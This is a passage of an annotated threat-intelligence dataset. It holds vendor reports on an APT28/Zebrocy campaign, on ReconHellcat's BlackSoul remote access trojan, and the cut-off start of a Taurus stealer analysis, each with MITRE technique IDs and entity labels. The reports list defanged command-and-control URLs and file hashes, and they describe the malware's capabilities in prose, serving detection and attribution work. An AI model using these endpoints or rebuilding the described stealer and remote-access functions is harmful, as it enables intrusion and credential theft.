to POST stolen data (e.g. screenshots) to hxxp://194.32.78[.]245/protect/get-upd-id[.]php\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"network_traffic_POST_1\")\n![](https://quointelligence.eu/wp-content/uploads/2020/09/code_snippet3.png \"network_traffic_POST_1\")\nAt a first glance, the data seems to be obfuscated and encrypted.\nAnother request looks like this:\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"network_traffic_POST_2\")\n![](https://quointelligence.eu/wp-content/uploads/2020/09/code_snippet4.png \"network_traffic_POST_2\")\nThe heading number 12345678 (the original eight digits were redacted) seems to be constant, suggesting its use as a unique ID of the infected machine.\nNotably, the same number is also used by the malware while creating the folder that contains sqlservice.exe\nLetting the sample talk to its actual C2 on the Internet did not change its actual behavior during our analysis.\nThe malware sends POST requests about once per minute without getting a response back.\nAdditionally, the server closes the connection after waiting for about 10 more seconds.\nIt is possible that this unresponsive behavior is due to the C2 determining the infected machine as not interesting.\nLastly, the network traffic generated to the C2 triggers the following Emerging Threats (ET) IDS rule:\n* ET TROJAN Zebrocy Screenshot Upload\u201d (SID: 2030122)\nVictimology and Attribution\n---------------------------\nQuoIntelligence concludes with medium-high confidence that the campaign targeted a specific government body, *at* *least* in Azerbaijan.\nAlthough Azerbaijan is not a NATO member, it closely cooperates with the North-Atlantic organizations and participates in NATO exercises.\nFurther, the same campaign very likely targeted other NATO members or countries cooperating with NATO exercises.\nBy analyzing the Tactics, Techniques and Procedures (TTPs), the targeting, and the theme used as a lure, we have high confidence in attributing this attack to the well-known APT28/Zebrocy TTPs disclosed by the security community in the last year.\nAn Interesting Coincidence.\n---------------------------\nAlthough we could not find any strong causation link yet or solid technical link between the two attacks, it should be noted the following points correlating with the ReconHellcat campaign [we uncovered](https://quointelligence.eu/2020/08/blackwater-malware-leveraging-beirut-tragedy-in-new-targeted-campaign/) on August 11:\n* Both the compressed Zebrocy malware and the OSCE-themed lure used to drop the BlackWater backdoor were uploaded the same day, on 5 August.\n* Both samples were uploaded by the same user in Azerbaijan and are highly likely by the same organization.\n* Both attacks happened in the same timeframe.\n* OSCE and NATO are both organizations that have been targeted (directly or indirectly) by APT28 in the past.\n* The victimology we identified for the ReconHellcat campaign is in line with the one targeted by the Zebrocy attack (i.e. similar type of government bodies).\nThe type of organizations targeted by both attacks is also in line with known APT28 victimology.\n* We assessed ReconHellcat as a high-capability APT group, like APT28.\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"VT_times\")\n![](https://quointelligence.eu/wp-content/uploads/2020/09/VT_times.png \"VT_times\")\nCitations\n---------\n[[1]](#_ftnref1) ESET, A1, April 2018, [Sednit update: Analysis of Zebrocy](https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/)\n[[2]](#_ftnref2) Palo Alto, B1, June 2018, [Sofacy Group\u2019s Parallel Attacks](https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/)\n[[3]](#_ftnref3) Kaspersky, A1, October 2018, [Shedding Skin \u2013 Turla\u2019s Fresh Faces](https://securelist.com/shedding-skin-turlas-fresh-faces/88069/)\n[[4]](#_ftnref4) Kaspersky, A1, Janurary 2019, [A Zebrocy Go Downloader](https://securelist.com/a-zebrocy-go-downloader/89419/)\n[[5]](#_ftnref5) Kaspersky, A1, January 2019, [GreyEnergy\u2019s overlap with Zebrocy](https://securelist.com/greyenergys-overlap-with-zebrocy/89506/)\n[[6]](#_ftnref6) Kaspersky, A1, June 2019, [Zebrocy\u2019s Multilanguage Malware](https://securelist.com/zebrocys-multilanguage-malware-salad/90680/)\nAppendix I \u2013 IOCs\n-----------------\nhxxp://194.32.78.245/protect/get-upd-id.php\n**Course 5 \u2013 16 October 2020.zipx**\n6e89e098816f3d353b155ab0f3377fe3eb3951f45f8c34c4a48c5b61cd8425aa\n**Course 5 \u2013 16 October 2020.xls (Corrupted file)**\nb45dc885949d29cba06595305923a0ed8969774dae995f0ce5b947b5ab5fe185\n**Course 5 \u2013 16 October 2020.exe (Zebrocy malware)**\naac3b1221366cf7e4421bdd555d0bc33d4b92d6f65fa58c1bb4d8474db883fec\n**Additional Zebrocy malware variants on VT**\nfae335a465bb9faac24c58304a199f3bf9bb1b0bd07b05b18e2be6b9e90d72e6\n\u00a0eb81c1be62f23ac7700c70d866e84f5bc354f88e6f7d84fd65374f84e252e76b\nMITRE ATT&CK\n------------\n| **TACTIC** | **TECHNIQUE** |\n| **Execution**  | [T1047: Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047/)  |\n| **Defense Evasion** | [T1140: Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140/) |\n| **Discovery** | [T1083: File and Directory Discovery](https://attack.mitre.org/techniques/T1083/)\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 [T1135: Network Share Discovery](https://attack.mitre.org/techniques/T1135/) [T1120: Peripheral Device Discovery](https://attack.mitre.org/techniques/T1120/) [T1057: Process Discovery](https://attack.mitre.org/techniques/T1057/) [T1012: Query Registry](https://attack.mitre.org/techniques/T1012/)\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 [T1082: System Information Discovery](https://attack.mitre.org/techniques/T1082/) [T1016: System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016/)\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 [T1049: System Network Connections Discovery](https://attack.mitre.org/techniques/T1049/) [T1033: System Owner/User Discovery](https://attack.mitre.org/techniques/T1033/)\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 [T1124: System Time Discovery](https://attack.mitre.org/techniques/T1124/) |\n| **Collection** | [T1560: Archive Collected Data](https://attack.mitre.org/techniques/T1560/) [T1119: Automated Collection](https://attack.mitre.org/techniques/T1119/) [T1113: Screen Capture](https://attack.mitre.org/techniques/T1113/) |\n| **Command and Control** | [T1105: Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) |\n| **Exfiltration** | [T1041: Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/) |\nDo you want to stay\u00a0informed of cyber and geopolitical threats targeting *your* organization.\nAre you interested in receiving exclusive and unpublished intelligence.\n[Get in touch!](https://quointelligence.eu/talk-to-an-expert/)\n* [Follow](https://twitter.com/QuoIntelligence \"Follow on Twitter\")[Follow](https://twitter.com/QuoIntelligence \"Twitter\")\n* [Follow](https://www.linkedin.com/company/quointelligence/ \"Follow on LinkedIn\")[Follow](https://www.linkedin.com/company/quointelligence/ \"LinkedIn\")\nJoin Our Newsletter.\n--------------------\nSubscribe to our newsletter to receive Weekly Intelligence Summaries, cyber news, and exciting updates.\nOnly valid business emails will be approved.\nPlease enable JavaScript in your browser to complete this form.Name *FirstLastBusiness Email *Checkboxes ** I have read and agree to the [Privacy Policy](https://quointelligence.eu/privacy-policy).\nGDPR Agreement ** I consent to having this website store my submitted information so they can respond to my inquiry.\nNameSubscribe", "mitre_ids": ["G0007", "T1566", "G0007", "TA0011", "TA0011", "G0007", "G0007", "G0007", "G0007", "G0007", "TA0011", "TA0011", "G0007", "G0007", "T1027", "T1027", "T1204", "T1203", "T1204", "T1566", "T1566", "T1036", "T1036", "T1053", "T1027", "TA0011", "T1071", "TA0011", "TA0011", "G0007", "T1027", "G0007", "G0007", "G0007", "G0010", "T1047", "T1140", "T1083", "T1135", "T1120", "T1057", "T1012", "T1082", "T1016", "T1049", "T1033", "T1124", "T1560", "T1119", "T1113", "T1105", "TA0011"], "anno_name_label": [["MALWARE", "Zebrocy"], ["MALWARE", "Zebrocy"], ["GROUP", "ReconHellcat"], ["MALWARE", "BlackWater"], ["MALWARE", "Zebrocy"], ["MALWARE", "Zebrocy"], ["MALWARE", "Zebrocy"], ["MALWARE", "Zebrocy"], ["MALWARE", "Zebrocy"], ["MALWARE", "Zebrocy"], ["MALWARE", "Zebrocy"], ["GROUP", "ReconHellcat"], ["MALWARE", "Zebrocy"], ["MALWARE", "BlackWater"], ["GROUP", "ReconHellcat"], ["MALWARE", "Zebrocy"], ["GROUP", "ReconHellcat"], ["MALWARE", "Zebrocy"], ["MALWARE", "Zebrocy"], ["MALWARE", "Zebrocy"], ["MALWARE", "Zebrocy"], ["MALWARE", "Zebrocy"], ["MALWARE", "Zebrocy"]], "cti_entity_class": ["CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "ReconHellcat Uses NIST Theme as Lure To Deliver New BlackSoul Malware\nJan 6, 2021\n**Introduction**\n----------------\nOn 27 November, QuoIntelligence detected a new malware, seemingly uploaded to VirusTotal by a user in Turkmenistan, which shares multiple similarities to the threat actor we previously dubbed ReconHellcat.\nThe campaign ultimately delivers a **previously undocumented remote access Trojan (RAT), which we dubbed *BlackSoul*.** After promptly alerting our customers, we notified Cloudflare about the C2 infrastructure hosted on their [Workers service](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjk96Lux4buAhXUGFkFHeTyDCQQFjAAegQIARAC&url=https%3A%2F%2Fworkers.cloudflare.com%2F&usg=AOvVaw2Zt-uFSsvY_asdQQ5FHkKr)\u00a0as per our responsible disclosure process.\nFurther analysis revealed the malware being part of a targeted\u00a0campaign, that\u00a0likely originated with a spear phishing email delivering\u00a0a [CAB](https://www.virustotal.com/gui/file/690872b8d0205203029b2b388b27f15a7673e9c02dab99f76216efc4a305cd4c/detection) archive.\nBoth the\u00a0CAB\u00a0and the file contained within are named\u00a01-10-20-hb44\\_final\u00a0to impersonate one of the documents\u00a0available on the [National Institute of Standards and Technology (NIST)](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjzuM7Vy4buAhUjGFkFHS83CiAQFjAAegQIARAD&url=https%3A%2F%2Fwww.nist.gov%2F&usg=AOvVaw0908J5PhTOUQuVLJt9JE9z) website.\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"archive_contents\")\n![](https://quointelligence.eu/wp-content/uploads/2021/01/archive_contents.png \"archive_contents\")\n*Figure 1: CAB archive contents*\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"NIST_document\")\n![](https://quointelligence.eu/wp-content/uploads/2021/01/NIST_document.png \"NIST_document\")\n*Figure 2: Legitimate NIST document URL and filename*\nTechnical Analysis\n------------------\nLoader.ReconHellcat\n-------------------\n| **File Name** | 1-10-20-hb44\\_final.exe\u00a0 |\n| **SHA256** | 3be1dd49f01e8b7ddf9af765693690d44356399b9e6043e51d5e13c82194b2a4\u00a0 |\n| **First Submission to VT** | 2020-11-27 10:41:21\u00a0 |\n| **First AV detection rate** | Low\u00a0(10/71)\u00a0 |\nDuring our analysis, we determined 1-10-20-hb44\\_final.exe is a malicious loader, which uses obfuscation similar to the variant observed in the previously [reported](https://quointelligence.eu/2020/08/blackwater-malware-leveraging-beirut-tragedy-in-new-targeted-campaign/) ReconHellcat campaign delivering BlackWater malware.\nAnother similarity is that the loader utilizes C2 infrastructure hosted on the Cloudflare Workers service.\nFollowing a successful C2 connection, the loader retrieves two files: (1) an executable named *blacksoul*, and (2) a Dynamic-Link Library (DLL) named *blacksoulLib*. Additionally, the loader opens Microsoft Word with the aforementioned legitimate document from the NIST website. Essentially, ReconHellcat uses this legitimate document as a decoy.\nThe blacksoul and blacksoulLib files have compilation timestamps from 27 and 26 November, respectively.\nBlackSoul\n---------\n| **File Name** | Bl4ck\\_S0ul6s5\\_1d7704b469.blacksoul\u00a0 |\n| **SHA256** | c49cad471a61adb5ea8a6d260887d1dd7f22de75d1143ce2a72828842ef4bb52\u00a0  |\n| **First Submission to VT** | 2020-11-29 18:23:26 |\n| **First AV detection rate** | Low\u00a0(18/71)\u00a0 |\nThe\u00a0second stage\u00a0executable is a\u00a0newly observed\u00a0malware family, which we\u00a0linked to the ReconHellcat threat actor.\nWe named the malware\u00a0\u201cBlackSoul\u201d\u00a0to\u00a0match its\u00a0internal name, main class name, and\u00a0file name.\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"class_name_BlackSoul\")\n![](https://quointelligence.eu/wp-content/uploads/2021/01/class_name_BlackSoul.png \"class_name_BlackSoul\")\n*Figure 3: Class name \u201cBlackSoul\u201d*\nThe malware is a classical minimal RAT, which is capable of file transfers and running arbitrary commands.\nThrough static analysis, we determined that the executable\u2019s main loop supports handling the following commands from its C2 server:\n|  | Command Field Names\u00a0 | Actions Taken\u00a0 |\n| **1** | params | Executes\u00a0a command and return the result.\n|\n| **2** | url\u00a0and\u00a0path\u00a0or media\u00a0and alternativeText\u00a0 | Downloads\u00a0file(s)\u00a0from\u00a0a URL\u00a0and stores\u00a0them\u00a0in\u00a0a destination\u00a0on the machine.\nCreates\u00a0a\u00a0destination folder if it does not\u00a0already\u00a0exist.\n|\n| **3** | paths | Likely retrieves\u00a0a\u00a0specified file\u00a0from the machine and uploads\u00a0it\u00a0to the C2.\n|\n| **4** | config | Updates\u00a0the configuration file (UsrClass.json)\u00a0which contains\u00a0C2 server info\u00a0and miscellaneous\u00a0fields.\n|\n*Table 1: BlackSoul Commands and Actions Taken*\nBlackSoul makes use of two files:\n* **UsrClass.json:** Contains a JSON configuration.\nIt is unclear if this file is mandatory or merely used to save existing configurations between invocations of BlackSoul.\n* **UsrClass.data:** Observed as a DLL with an Init() export, which we refer to as blacksoulLib and will describe in depth in the next section.\nBlackSoul uses information gathered by blacksoulLib to call back to the C2 over the RESTful Strapi protocol and JSON based data encoding.\nThe RAT\u2019s string obfuscation applies only to strings in the main program but excludes strings of third-party compiled in libraries.\nBlackSoul additionally uses various other techniques for obfuscation.\nIn particular, strings are constructed dynamically on the stack and deobfuscated with a variety of mechanisms, such as a fixed key XOR cipher and a Caesar cipher using variable shift values.\nblacksoulLib\n------------\n| **File Name** | Bl4ck\\_S0ul6s5\\_faac59ebe2.blacksoulLib\u00a0 |\n| **SHA256** | fdd310ce1b4f03a79f7a6eda8df793f4c0718766228a9a0700cf0b5a4ea648e2 |\n| **First Submission to VT** | 2020-11-26 23:45:57 |\n| **First AV detection rate** | Low (18/71) |\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"export_of_blacksoullib\")\n![](https://quointelligence.eu/wp-content/uploads/2021/01/export_of_blacksoullib.png \"export_of_blacksoullib\")\n*Figure 4: exports of the originally named blacksoulLib*\nThe file is a DLL with a single export, Init(), which is called by BlackSoul.\nIn this instance, its primary functions are:\n* Searching the victim\u2019s machine for Firefox, Chrome, and Opera data.\nIf the browser data is not found, the program terminates early.\n* Decoding a C2 URL later used by BlackSoul\n* Decoding a Cloudflare DNS-over-HTTPS (DoH) URL.\n* Generating further login information for the C2 and returning gathered data to BlackSoul in JSON format, including:\n+ A username with three random appended characters.\n+ A password consisting of 24 random characters.\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"blacksoullib_C2_url_decrypt_and_setting_param\")\n![](https://quointelligence.eu/wp-content/uploads/2021/01/blacksoullib_C2_url_decrypt_and_setting_param-.png \"blacksoullib_C2_url_decrypt_and_setting_param\")\n**Figure 5:** C2 URL decryption and setting of the URL parameter\nBased on our observations, the DLL\u2019s specific functionality adapts to various victims\u2019 environments, and the DLL outputs different C2 information for various targets.\nVictimology\n-----------\nQuoIntelligence was unfortunately unable to uncover the entities targeted by this campaign.\nThe only information at hand relies on:\n* The VirusTotal submitter\u2019s country (Turkmenistan)\n* The theme used as a lure (NIST)\nDue to the limited information available to determine victimology, we cannot definitively state a target.\nHowever, it is likely that the BlackSoul campaign targeted a government-related body based on the theme lure, since NIST develops and publicizes security compliance standard for the US Federal Government and any organization who handles government data.\nAs well, previously observed ReconHellcat campaign targets consisted of primarily defense and diplomatic government bodies.\nAttribution\n-----------\nWhen we initially discovered ReconHellcat, its campaign characteristics and Tactics, Techniques, and Procedures (TTPs) were unique enough to classify it as a new threat actor.\nDuring our analysis of the new BlackSoul campaign, we identified limited yet sufficient similarities overlapping with the earlier observed BlackWater campaign.\nAs a result, we have high confidence attributing this attack to ReconHellcat.\nSimilarities\u00a0to earlier ReconHellcat\u00a0campaigns:\n-----------------------------------------------\n* Lure themes of government related organization materials.\n* Usage of compressed archives, likely via spear phishing email links or attachments, to distribute the initial attack artifacts.\n* A three-stage attack scheme.\nSimilarities\u00a0between\u00a0ReconHellcat\u2018s\u00a0BlackSoul and BlackWater malware:\u00a0\n* Supports\u00a0DNS-over-HTTPS\u00a0(DoH)\u00a0using cloudflare-dns.com.\n* Has clear internal\u00a0naming\u00a0likely\u00a0due to\u00a0a\u00a0lack\u00a0of artifact cleanup in the malware build process.\n* Resolves\u00a0the C2 hostnames via\u00a0DNS over HTTPS (DoH)\u00a0using a built-in feature of libcurl, aclient-side URL transfer library.\n* Contains\u00a0paths and parameters to use\u00a0Strapi\u00a0\u2013 a\u00a0content management system (CMS).\n* Identical string obfuscation.\n* Uses\u00a0Cloudflare Workers Service (*.workers[.]dev)\u00a0to host\u00a0C2\u00a0infrastructure.\n* JSON\u2013encoded communications.\n* Similar kind of randomized\u00a0login (user registration)\u00a0scheme with the\u00a0C2\u00a0server.\n* Malware samples\u00a0contain\u00a0a\u00a0\u2018Black\u2019\u00a0prefix in\u00a0their naming\u00a0schemes.\nTo note, although we have not found a strong correlation or technical link between ReconHellcat and APT28, there are shared characteristics between the two groups, which we highlighted in our recent APT28 [reporting](https://quointelligence.eu/2020/09/apt28-zebrocy-malware-campaign-nato-theme/).\nAppendix I \u2013 IOCs\n-----------------\nhxxps://noisy-haze-af47.fromhell.workers.dev/uploads/Bl4ck\\_S0ul6s5\\_1d7704b469.blacksoul\u00a0\nhxxps://noisy-haze-af47.fromhell.workers.dev/uploads/Bl4ck\\_S0ul6s5\\_faac59ebe2.blacksoulLib\u00a0\nhxxps://shrill-wave-90be.0black.workers.dev/\u00a0\u00a0\n**Loader.ReconHellcat**\n3be1dd49f01e8b7ddf9af765693690d44356399b9e6043e51d5e13c82194b2a4\u00a0\n**BlackSoul**\nc49cad471a61adb5ea8a6d260887d1dd7f22de75d1143ce2a72828842ef4bb52\u00a0\n**blacksoulLib**\nfdd310ce1b4f03a79f7a6eda8df793f4c0718766228a9a0700cf0b5a4ea648e2\u00a0\nMITRE ATT&CK\n------------\n| **TACTIC** | **TECHNIQUE** |\n| **Initial Access**  | [T1566: Phishing](https://attack.mitre.org/techniques/T1566/)  |\n| **Execution**  | [T1204: User Execution](https://attack.mitre.org/techniques/T1204/)   |\n| **Defense Evasion** | [T1027: Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/)  |\n| **Credential Access**  | [T1555: Credentials from Password Stores](https://attack.mitre.org/techniques/T1555/)   |\n| **Discovery** | [T1082 System Information Discovery](https://attack.mitre.org/techniques/T1082/)  |\n| **Collection** | [T1005: Data from Local System](https://attack.mitre.org/techniques/T1005/)  |\n| **Command and Control** | [T1132: Data Encoding](https://attack.mitre.org/techniques/T1132/)\n[T1105: Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)\n[T1572: Protocol Tunneling](https://attack.mitre.org/techniques/T1572/)  |\n| **Exfiltration** | [T1041: Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/)\n[T1020: Automated Exfiltration](https://attack.mitre.org/techniques/T1020/) |\nDo you want to stay\u00a0informed of cyber and geopolitical threats targeting *your* organization.\nAre you interested in receiving exclusive and unpublished intelligence.\n[Get in touch!](https://quointelligence.eu/talk-to-an-expert/)\n* [Follow](https://twitter.com/QuoIntelligence \"Follow on Twitter\")[Follow](https://twitter.com/QuoIntelligence \"Twitter\")\n* [Follow](https://www.linkedin.com/company/quointelligence/ \"Follow on LinkedIn\")[Follow](https://www.linkedin.com/company/quointelligence/ \"LinkedIn\")\nJoin Our Newsletter.\n--------------------\nSubscribe to our newsletter to receive Weekly Intelligence Summaries, cyber news, and exciting updates.\nOnly valid business emails will be approved.\nPlease enable JavaScript in your browser to complete this form.Name *FirstLastBusiness Email *Checkboxes ** I have read and agree to the [Privacy Policy](https://quointelligence.eu/privacy-policy).\nGDPR Agreement ** I consent to having this website store my submitted information so they can respond to my inquiry.\nEmailSubscribe", "mitre_ids": ["T1566", "TA0011", "T1566", "T1027", "T1105", "TA0011", "TA0011", "T1041", "TA0011", "TA0011", "T1041", "TA0011", "TA0011", "T1041", "T1041", "T1027", "T1027", "T1140", "T1005", "T1140", "TA0011", "TA0011", "T1140", "TA0011", "T1566", "T1566", "TA0011", "T1071", "TA0011", "T1132", "TA0011", "G0007", "G0007", "T1566", "T1204", "T1027", "T1555", "T1082", "T1005", "T1132", "T1105", "T1572", "T1041", "T1020"], "anno_name_label": [["GROUP", "ReconHellcat"], ["MALWARE", "BlackSoul"], ["GROUP", "ReconHellcat"], ["MALWARE", "BlackSoul"], ["GROUP", "ReconHellcat"], ["MALWARE", "BlackWater"], ["GROUP", "ReconHellcat"], ["MALWARE", "BlackSoul"], ["GROUP", "ReconHellcat"], ["MALWARE", "BlackSoul"], ["MALWARE", "BlackSoul"], ["MALWARE", "BlackSoul"], ["MALWARE", "BlackSoul"], ["MALWARE", "BlackSoul"], ["MALWARE", "BlackSoul"], ["MALWARE", "BlackSoul"], ["MALWARE", "BlackSoul"], ["MALWARE", "BlackSoul"], ["MALWARE", "BlackSoul"], ["MALWARE", "BlackSoul"], ["GROUP", "ReconHellcat"], ["GROUP", "ReconHellcat"], ["MALWARE", "BlackSoul"], ["MALWARE", "BlackWater"], ["GROUP", "ReconHellcat"], ["GROUP", "ReconHellcat"], ["GROUP", "ReconHellcat"], ["MALWARE", "BlackSoul"], ["MALWARE", "BlackWater"], ["TOOL", "libcurl"], ["GROUP", "ReconHellcat"], ["MALWARE", "BlackSoul"]], "cti_entity_class": ["CE", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Taurus: The New Stealer in Town\nJune 26, 2020\nA sandbox is a valuable tool in the ongoing battle against cybercriminals and bad actors are continually looking for ways to avoid detection.\nOne of the newest ones we observed, Taurus, includes techniques to evade\u00a0sandbox detection.\nWas this new malware able to go undetected by the [Zscaler Cloud Sandbox](/products/sandboxing).\n(Spoiler alert: It wasn't.\nLet's take a closer look at the Taurus stealer.\nIn early June 2020, we observed and began tracking a new malware campaign.\nDuring our research, we observed that the \"Predator the Thief\"\u00a0cybercriminal group is behind the development of this stealer, named Taurus,\u00a0and is selling it on dark forums for $100\u00a0or rebuilt\u00a0with a new domain for $20.\nThe group selling Taurus claims\u00a0that this stealer is capable of stealing passwords, cookies, and autofill forms along with the history of Chromium- and Gecko-based browsers.\nTaurus\u00a0can also steal some popular cryptocurrency wallets, commonly used FTP clients credentials, and email clients credentials.\nThis stealer\u00a0also collects information, such as installed software and system configuration, and sends that information\u00a0back to the attacker.\nTaurus is designed to not execute in countries within the Commonwealth of Independent States (CIS), which includes Azerbaijan, Armenia, Belarus, Georgia, Kazakhstan, Kyrgyzstan, Moldova, Russia, Tajikistan, Turkmenistan, Uzbekistan, and Ukraine.\n(Turkmenistan and Ukraine are both unofficial members of the organization.\nGeorgia was a member of the CIS but left the group in 2008.\n**Infection cycle**\n![Infection cycle](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/infection%20(1)_0.png)\n*Figure 1: Infection cycle of the Taurus campaign*\n**Distribution method**\nWhile tracking the campaign, we noticed that attackers initiated this campaign by sending a spam mail to the victim containing a malicious attachment.\nBelow are the details of the spam mail we observed:\nFrom: \"[[email\u00a0protected]](/cdn-cgi/l/email-protection)\" <[[email\u00a0protected]](/cdn-cgi/l/email-protection)>\nReceived: from daqrey.site (unknown [91.191.184.35])\nDate: Fri, 5 Jun 2020 16:56:35\nSubject: Penalty Charge Notice\nAttachment: pay-violation1011066.doc\nThe attachment (pay-violation1011066.doc) contained\u00a0malicious macro code to download further payloads.\n![Doc file](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/doc%20file.PNG)\n*Figure 2: The attached malicious doc asks users\u00a0to enable a macro.*\n**Installation**\nOnce\u00a0the document is opened, it prompts the user to enables the macro.\nOnce the content is enabled, an AutoOpen() subroutine is called, which\u00a0will run the malicious Visual Basic for Applications\u00a0(VBA) macro wherein a PowerShell script is executed via BitsTransfer,\u00a0downloads three different files of the\u00a0**Taurus Project** from the Github site, then\u00a0saves them in a\u00a0Temp folder with predefined names.\n![obfuscated macro](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/Obfuscated%20macro%20code.PNG)\n*Figure 3: The obfuscated VBA macro code*\nThe macro contains the URL of the payload as a combination of the following obfuscations: Base64 encoded and reversed string.\nUpon decrypting the obfuscated macro code, we see the\u00a0PowerShell script, as shown in Figure 4.\n![Decypted powershell](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/decryptd%20powershell.PNG)\n*Figure 4: The decrypted PowerShell script used to download\u00a0the payload.*\nFurther, these three files get downloaded from Github and dropped in the %Temp% directory.\nThe three files are:\n1.**GeTNht.com** \u2192 saved with the name *\u201c****j2tyq.com****\u201d \u2192* Legitimate AutoIt3.exe\n2.**bAMI.com \u2192** saved with the name **\u201cst6zh\u201d \u2192** Base64-encoded AutoIt script having certificate header\n3.**wsNcf.com** \u2192 saved with the name **\u201cwsNcf.com\u201d** \u2192 Taurus Stealer\nHere, PowerShell is using the Certutil.exe command to decode the payload and execute it on the victim's machine.\nThe Twitter handle\u00a0[@3xp0rt](https://twitter.com/3xp0rtblog/status/1254079067810336768),\u00a0which exposes\u00a0documents from a Russian hacking forum, shows some of the claims of the Taurus project.\n![Tauras Project claim about stealing ability of malware](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/taurus%20project%20message.PNG)\n*Figure 5: The Taurus project claims to have the stealing ability of malware.*\nThe author claims that Taurus\u00a0has the following stealing capabilities:\n* Stealing cookies, Auto-form details, browsing history, and credit card information from Chromium-\u00a0and Gecko-based browsers.\n* Cookies and passwords from Microsoft\u00a0Edge browsers.\n* Credential stealing of some cryptocurrency wallets, including Electrum, MultiBit, Ethereum, Jaxx Liberty, Bytecoin, Atomic, and Exodus\n* Stealing credential of FTP clients, including FileZilla, WinFTP, and WinSCP\n* Stealing session files from applications, including Discord, Steam, Telegram, and Authy\n* Stealing account information of the Battle.Net service\n* Stealing Skype history\n* Stealing credentials from NordVPN\n* Stealing credentials from Pidgin, Psi+, and Psi\n* Stealing credentials from Foxmail and Outlook\n* Collects system information, such as\u00a0system configuration and list of installed software.\n![Taurus panel](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/panel.PNG)\n*Figure 6: The\u00a0[Taurus login panel](https://www.virustotal.com/gui/file/4a30ef818603b0a0f2b8153d9ba6e9494447373e86599bcc7c461135732e64b2/detection).*\nThe Taurus project has also built a dashboard where the attacker can keep an eye on the infection counts according to geolocations.\n![geolocation](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/dashboard%20of%20Taurus.PNG)\n*Figure 7: The Taurus d[ashboard](https://twitter.com/MalwareInt/status/1257838534993621002/photo/3) to see infection count according to geolocation.*\nThis dashboard also provides the attacker with the ability\u00a0to customize the configuration of Taurus.\n![dashboard to config](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/dashboard%20to%20set%20config.PNG)\n*Figure 8: The attacker can update the configuration of Taurus in the [dashboard](https://twitter.com/3xp0rtblog/status/1254079343581675525/photo/2).*\n**Technical analysis of the payload**\nOnce PowerShell downloads the three different files from the 